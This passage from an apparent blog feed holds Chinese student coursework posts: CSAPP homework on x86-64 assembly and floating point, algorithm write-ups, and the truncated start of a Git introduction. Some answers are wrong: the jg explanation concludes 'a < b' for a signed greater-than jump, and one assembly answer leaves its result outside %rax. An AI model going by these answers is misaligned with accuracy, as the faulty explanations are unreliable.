      <url>/2022/10/06/ji-suan-ji-xi-tong-gai-lun-zuo-ye-2/</url>
      
        <content type="html"><![CDATA[<h1 id="HW-2"><a href="#HW-2" class="headerlink" title="HW 2"></a>HW 2</h1><ol><li><p>使用不超过 $3$ 条 $x86$ 指令实现如下函数: 其中 $x, y, z, w$ 分别存储于 %rdi, %rsi, %rdx, %rcx. 返回值存储于 %rax. </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">long</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">,</span> <span class="token keyword">long</span> w<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> y <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> z <span class="token operator">+</span> w<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">add:leaq (%rsi,%rdi,4), %rsileaq (%rcx,%rsi,8), %rcxleaq (%rcx,%rdx,4), %rcxret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>$X86-64$ 体系结构中的条件跳转指令 $jg$ 是用于带符号数比较还是无符号数比较的? 其产生跳转的成立条件是 ~(SF^OF) &amp; ~ZF​ 为真, 请解释为何是这一条件. </p><p><strong>答:</strong></p><p>条件跳转指令 $jg$ 是用于带符号数比较的.</p><p>考虑被比较的两个数 $a, b$, 当 $\text{~(SF^OF)&amp;~ZF}$ 为真时: </p><p>有 $\text{~(SF^OF)}$ 为真, 则 $\text{SF^OF}$为假, 从而 $\text{SF = OF = 1}$ 或 $\text{SF = OF = 0}$, </p><p>即此时 $a\le b$.</p><p>同时有 $\text{~ZF}$ 为真, 则 $\text{ZF}$为假, 从而 $\text{ZF = 0}$, </p><p>即此时 $a\ne b$.</p><p>故 $a &lt; b$ 成立.</p></li><li><p>有如下对应的 $C$ 代码与汇编代码 $(x86-64)$, 请对照着填上代码中缺失的部分(数字请用十进制表示). </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call_swap: subq $24, %rsp movl __①__, 12(%rsp) movl $91125, 8(%rsp) leaq 8(%rsp), %rsi leaq 12(%rsp), __④__ movl $0, %eax call swap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">call_swap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">int</span> zip1 <span class="token operator">=</span> <span class="token number">15213</span><span class="token punctuation">;</span> <span class="token keyword">int</span> zip2 <span class="token operator">=</span> __②__<span class="token punctuation">;</span> __③__<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>① :  <u>$15213</u></p><p>② :  <u>91125</u></p><p>③ :  <u>swap(&amp;zip1, &amp;zip2)</u></p><p>④ :  <u>%rdi</u></p></li><li><p>一个 $C$ 语言的 $for$ 循环代码 (部分) 及其 $64$ 位 $Linux$ 汇编如下所示, 请对照汇编填充 $C$ 语言里的缺失部分.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">looper</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>             x <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">else</span>             x <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> x<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">looper:     movl $0, %eax     movl $0, %edx     jmp .L2 .L4:     movslq %edx, %rcx     movl (%rsi,%rcx,4), %ecx     addl $1, %eax     cmpl %eax, %ecx     jle .L3     leal (%rcx,%rcx), %eax .L3:     addl $1, %edx .L2:     cmpl %edi, %edx     jl     .L4     ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>对于如下代码 </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">long</span> <span class="token function">v2permute</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>array<span class="token punctuation">,</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token number">8253</span> <span class="token operator">*</span> x<span class="token punctuation">;</span>     <span class="token keyword">long</span> t2 <span class="token operator">=</span> array<span class="token punctuation">[</span>t1 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> y<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">long</span> t3 <span class="token operator">=</span> array<span class="token punctuation">[</span>t2 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> z<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">long</span> t4 <span class="token operator">=</span> t1 <span class="token operator">+</span> t2 <span class="token operator">+</span> t3<span class="token punctuation">;</span>     <span class="token keyword">long</span> t5 <span class="token operator">=</span> array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> t1<span class="token punctuation">;</span>     <span class="token keyword">long</span> ret <span class="token operator">=</span> t3 <span class="token operator">&amp;</span> t5<span class="token punctuation">;</span>     <span class="token keyword">return</span> ret<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应如下汇编指令, 请写出每条指令之后目标寄存器存储的变量/临时变量值.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">v2permute:     movq %rdx, %r8    movq %rcx, %rdx     imulq $8253, %rsi, %rax     leaq (%rax,%r8,2), %rcx     movq (%rdi,%rcx,8), %rcx     salq $4, %rcx     addq %rdx, %rcx     imulq (%rdi), %rax     andq (%rdi,%rcx,8), %rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>① : <u>y</u></p><p>② : <u>z</u></p><p>③ : <u>8253 * x</u></p><p>④ : <u>8253 <em> x + 2 </em> y</u></p><p>⑤ : <u>array[8253 <em> x + 2 </em> y]</u></p><p>⑥ : <u>16 <em> array[8253 </em> x + 2 * y]</u></p><p>⑦ : <u>16 <em> array[8253 </em> x + 2 * y] + z</u></p><p>⑧ : <u>array[0] <em> 8253 </em> x</u></p><p>⑨ : <u>array[16 <em> array[8253 </em> x + 2 <em> y] + z] &amp; (array[0] </em> 8253 * x)</u></p></li><li><p>请对照下面的 $C$ 语言代码与相应汇编 $(Linux X86-64)$, 给出 $M$、$N$ 的值.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">copy_element:     movslq  %edi, %rdi     movslq  %esi, %rsi     leaq    (%rsi,%rsi,2), %rax     leaq    (%rsi,%rax,4), %rax     addq    %rdi, %rax     movl    mat2(,%rax,4), %edx     leaq    0(,%rdi,8), %rax     subq    %rdi, %rax     addq    %rax, %rsi     movl    %edx, mat1(,%rsi,4)     ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">M</span> <span class="token expression"><span class="token number">13</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">7</span></span></span><span class="token keyword">int</span> mat1<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> mat2<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">copy_element</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span> mat1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> mat2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业1</title>
      <link href="/2022/10/03/ji-suan-ji-xi-tong-gai-lun-zuo-ye-1/"/>
      <url>/2022/10/03/ji-suan-ji-xi-tong-gai-lun-zuo-ye-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CSAPP-HW-1"><a href="#CSAPP-HW-1" class="headerlink" title="CSAPP HW 1"></a>CSAPP HW 1</h1><ol><li>在所有由五个 $1$ 和三个 $0$ 组成的 8 位二进制整数 (补码形式) 中, 最小的数是 <u><strong>10001111</strong></u>,  最大的数是 <u><strong>01111100</strong></u>.  </li><li>已知 $[X]_{补码}$＝0x0043, $[Y]_{补码}$＝0xCE50, 则 $[X+Y]_{补码}$＝ <u><strong>0xCE93</strong></u>, $[X-Y]_{补码}$＝ <u><strong>0x31F3</strong></u>.  ($X$、$Y$ 的数据位宽均为 16 位, 计算结果用 16 进制的补码表示) </li><li>假设存在一种 16 位的浮点数表示, $exp$ 位数是 7, $frac$ 位数是 8, 符号位数是 1, 其所能表示的最大的非规格化数的 $exp$ 是 <u><strong>0000000</strong></u>, $frac$ 是 <u><strong>11111111</strong></u>;  250 (十进制数) 的 $exp$ 是 <u><strong>1000110</strong></u>, $frac$ 是 <u><strong>11110100</strong></u>. (请用 0、1 位串表示答案) </li><li>假设存在一种 9 位浮点数 (符合 IEEE 浮点数标准), 符号位数是 1, $exp$ 位数是 4, $frac$ 位数是 4. 其数值被表示为 $V = (-1)^S × M × 2^E$ 形式. 请在下表中填空.<br>$Binary$: 该浮点数的 9 位二进制表示; $M$：表示为十进制数; $E$：表示为十进制整数;<br>$Value$: 被表示的具体数值, 十进制数表示.</li></ol><div class="table-container"><table><thead><tr><th style="text-align:center">描述</th><th style="text-align:center">Binary</th><th style="text-align:center">M</th><th style="text-align:center">E</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">5.0</td><td style="text-align:center"><strong>010010100</strong></td><td style="text-align:center"><strong>1.25</strong></td><td style="text-align:center"><strong>2</strong></td><td style="text-align:center">5.0</td></tr><tr><td style="text-align:center">最小的大于 0 浮点数</td><td style="text-align:center"><strong>000000001</strong></td><td style="text-align:center"><strong>0.0625</strong></td><td style="text-align:center"><strong>-6</strong></td><td style="text-align:center"><strong>0.0009765625</strong></td></tr></tbody></table></div><ol><li><p>给定相同的字长 (例如 32 位) , 能表示的定点数多还是浮点数多？</p><p><strong>答:</strong> </p><ul><li>能表示的定点数个数多.</li><li>对32位浮点数而言, 如果exp位置全为1, 会产生 $\infty$ 与 $NaN$, 进而个数少于 $2^{32}$;</li><li>而对32位定点数而言, 固定小数点都能产生 $2^{32}$ 个不一样的数.</li><li>推广到其他字长, 这都是成立的.</li><li>因此给定相同的字长, 能表示的定点数个数更多.</li></ul></li><li><p>假设存在一种 16 位浮点数 (符合 IEEE 浮点数标准) , $exp$ 位数是 5,  $frac$ 位数是 10, 符号位数是 1. 某同学对该格式的一个数 $x$ 执行了 (整数的) 按位右移操作, 得到了 80.5.  若右移操作按有符号数执行 (算术右移) , 原来的数可能是 <u><strong>不存在</strong></u>, 若右移操作按无符号数执行 (逻辑右移) , 原来的数可能是 <u><strong>-0.04736328125 或 -0.047393798828125</strong></u> (列出所有情况或填入“不存在”, 数可以用小数或分数来表示, 必须精确).  </p></li><li><p>使用不超过 4 次位运算或加减运算完成整数运算 $y = x * 85$ (允许引入临时变量, 不需考虑溢出的情况) . </p><p><strong>答:</strong> </p><ul><li><strong>$tmp1 = x &lt;&lt; 2$       ( $tmp1 = x * 4$ )</strong></li><li><strong>$tmp2 = tmp1 + x$      ( $tmp2 = x * 5$ )</strong></li><li><strong>$tmp3 = tmp2 &lt;&lt; 4$    ( $tmp3 = x * 80$ )</strong></li><li><strong>$y = tmp3 + tmp2$      ( $y = x * 85$ )</strong></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Graphics</title>
      <link href="/2022/09/30/graphics/"/>
      <url>/2022/09/30/graphics/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA1"><a href="#CST-PA1" class="headerlink" title="CST PA1"></a>CST PA1</h1><h2 id="1-2-A-B-Graphics"><a href="#1-2-A-B-Graphics" class="headerlink" title="1-2 A+B Graphics"></a>1-2 A+B Graphics</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>容易想到先将横轴和纵轴的端点进行排序预处理, 进而确定 $n$ 条线段的具体端点. 通过二分查找, 对于其中每条线段使用 <code>ToLeft</code> 测试来判断其与所给出点 $P$ 和原点 $O$ 的连线段 $OP$ 是否有交点, 高效查找出临界交点, 进而确定总交点的数目.</p><p>进行<code>ToLeft</code> 测试判断两条直线是否有交点, 可以先算出 $n$ 条线段相应横纵坐标乘积并存储, 以便进行 <code>ToLeft</code> 测试时无需重复计算, 优化算法时间性能.</p><p>由于端点坐标数据范围为 $[1, 2^{31})$, 选用 $\text{long long}$ 数组来存储坐标与相应乘积; 二分查找时对于几种临界情况进行了特殊处理与返回, 主要包含全无交点与全部交点两种情况.</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>对 $x$ 轴和 $y$ 轴上的点坐标进行排序主要参考了<a href="https://www.runoob.com/cprogramming/c-function-qsort.html">此文章</a>, 选择了 <code>&lt;stdlib.h&gt;</code> 中的 <code>qsort()</code> 函数;</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>数据输入过程的时间复杂度为 $O(n)$; 数据排序过程的时间复杂度为 $O(nlogn)$.</p><p>而算法时间复杂度主要来自二分查找交点的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 13</span><span class="token comment">// cross 函数返回与线段 OP 存在交点的最上方线段标号.</span><span class="token keyword">int</span> <span class="token function">cross</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> high <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>              mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>                  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每经过一次 <code>while</code> 循环都要访问若干次 <code>toleft</code> 函数, 此函数调用的时间为常数时间, 因此 <code>cross</code> 函数的时间复杂度与二分查找相同, 为 $O(logn)$.</p><p>进而对于 $n$ 条线段信息的输入, 进行 $m$ 次查询, 算法的时间复杂度为 $O(mlogn)$.</p><p>算法空间复杂度主要来自存储横纵坐标与相应乘积的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">long</span> <span class="token keyword">long</span> x<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> y<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> z<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正比于输入数据的数目, 对于 $n$ 条线段信息的输入, 算法的空间复杂度为 $O(n)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A+B Problem</title>
      <link href="/2022/09/27/a-b-problem/"/>
      <url>/2022/09/27/a-b-problem/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA1"><a href="#CST-PA1" class="headerlink" title="CST PA1"></a>CST PA1</h1><h2 id="1-1-A-B-Problem"><a href="#1-1-A-B-Problem" class="headerlink" title="1-1 A+B Problem"></a>1-1 A+B Problem</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>一开始考虑使用普通的高精度乘法处理本题:</p><blockquote><p>使用 $\text{string}$ 存储读入的长正整数 $a = \overline{a_{n - 1}a_{n - 2}\cdots a_1a_0}$, $b = \overline{b_{m - 1}b_{m - 2}\cdots b_1b_0}$, 并逐位计算乘积 $c = \overline{c_{l - 1}c_{l - 2}\cdots c_1c_0}$, 满足 $c_k = (\Sigma a_ib_{k - i} + d_k) / 10$, 其中 $d_k$ 为计算 $c_{k - 1}$ 过程产生的进位溢出, 满足 $d_k = (\Sigma a_ib_{k - 1 - i} + d_{k - 1}) \% 10$.</p></blockquote><p>美中不足的是, 这种处理方法计算次数过多, 消耗时间过长, 因此考虑采用压位高精度乘法, 即在上述算法中乘数的每位数字均存入一个 $8$ 位整数, 而非一个简单的十进制整数. 这样扩大了参与单次计算的数据位数, 进而减少了计算次数, 降低了算法耗时.</p><p>由于 $\text{int}$ 的范围为 $[- 2^{31}, 2^{31} - 1]$, 其中 $2^{31} - 1 &lt; 10^8 * 10^8$, 在进行 $8$ 位数运算时可能会产生溢出, 因此不可选用 $\text{int}$ 存储乘数;</p><p>注意到 $\text{long long}$ 的范围为 $[- 2^{63}, 2^{63} - 1]$, 其中 $2^{63} - 1 &gt; 10^8 * 10^8$, 因此这里选用 $\text{long long}$ 数组来存储乘数. 本题也就相当于模拟 $100,000,000$ 进制的乘法. 本题算法思路如下:</p><blockquote><p>使用 $\text{long long}$ 数组存储读入的长正整数 $a = \overline{a_{n’ - 1}a_{n’ - 2}\cdots a_1a_0}$, $b = \overline{b_{m’ - 1}b_{m’ - 2}\cdots b_1b_0}$, 其中 $a_i, b_j (1\le i\le n’, 1\le j\le m’)$ 均为 $8$ 位整数. 剩下的仿照上文所述的乘法计算及进位过程即可.</p></blockquote><p>代码中的 <code>mul1</code>、 <code>mul2</code> 数组相当于此处的 $a, b$, 而 <code>answer</code> 数组记录了相应 $c$ 的取值.</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>使用了一个快速将 $\text{string}$ 按每八位读入数组的 $trick$, 主要参考了<a href="https://zhuanlan.zhihu.com/p/369302523">此文章</a>, 调用了 <code>&lt;stdio.h&gt;</code> 中的 <code>sscanf()</code> 函数.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自乘法运算与进位过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 48 </span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> LEN<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> real_len2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> finish <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> real_len1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> start<span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> finish<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> mul1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">*</span> mul2<span class="token punctuation">[</span>i <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> MAX<span class="token punctuation">)</span> <span class="token punctuation">{</span>                         answer<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> MAX<span class="token punctuation">;</span>        answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%=</span> MAX<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于一组长整数输入$m$、$n$, 算法的时间复杂度为 $O(logm\cdot logn)$;</p><p>也即若一组长整数输入的十进制位数分别为$m$、$n$, 那么算法的时间复杂度为 $O(mn)$.</p><p>算法空间复杂度主要来自读取并存储运算数的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 22</span><span class="token keyword">char</span><span class="token operator">*</span> num1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> num2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 27</span><span class="token keyword">long</span> <span class="token keyword">long</span> mul1<span class="token punctuation">[</span>real_len1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> mul2<span class="token punctuation">[</span>real_len2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> answer<span class="token punctuation">[</span>MAXLEN<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正比于输入数据的长度, 对于一组长整数输入$m$、$n$, 算法的空间复杂度为 $O(logm + logn) = O(log(mn))$;</p><p>也即若一组输入的十进制位数分别为$m$、$n$, 那么算法的空间复杂度为 $O(m + n)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git入门学习</title>
      <link href="/2022/09/23/git-ru-men-xue-xi/"/>
      <url>/2022/09/23/git-ru-men-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="What-Are-VCSs"><a href="#What-Are-VCSs" class="headerlink" title="What Are VCSs?"></a>What Are VCSs?</h2><p>Version control systems (VCSs) are tools used to track changes to a folder and its contents in a series of snapshots. They also maintain metadata like who created each snapshot, messages associated with each snapshot, and so on.</p><p>While other VCSs exist, <strong>Git</strong> is the de facto standard for version control. </p><h2 id="Data-Model"><a href="#Data-Model" class="headerlink" title="Data Model"></a>Data Model</h2><p>Git has a well-thought-out model that enables maintaining history, supporting branches, and collaboration.</p><h3 id="Snapshots"><a href="#Snapshots" class="headerlink" title="Snapshots"></a>Snapshots</h3><p>Git models the history of a collection of files and folders within some top-level directory as a series of snapshots.</p><ul><li>File — Blob</li><li>Directory — Tree </li><li>Snapshot — The top-level tree being tracked</li></ul><h3 id="History-Relating-snapshots"><a href="#History-Relating-snapshots" class="headerlink" title="History: Relating snapshots"></a>History: Relating snapshots</h3><p>In Git, a history is a directed acyclic graph (DAG) of snapshots. This means that each snapshot in Git refers to a set of “parents”, the snapshots that preceded it. Moreover, a snapshot might descend from multiple parents due to combining (merging) two parallel branches of development.</p><h3 id="Data-model-As-pseudocode"><a href="#Data-model-As-pseudocode" class="headerlink" title="Data model: As pseudocode"></a>Data model: As pseudocode</h3><p>It is instructive to see Git’s data model written down in 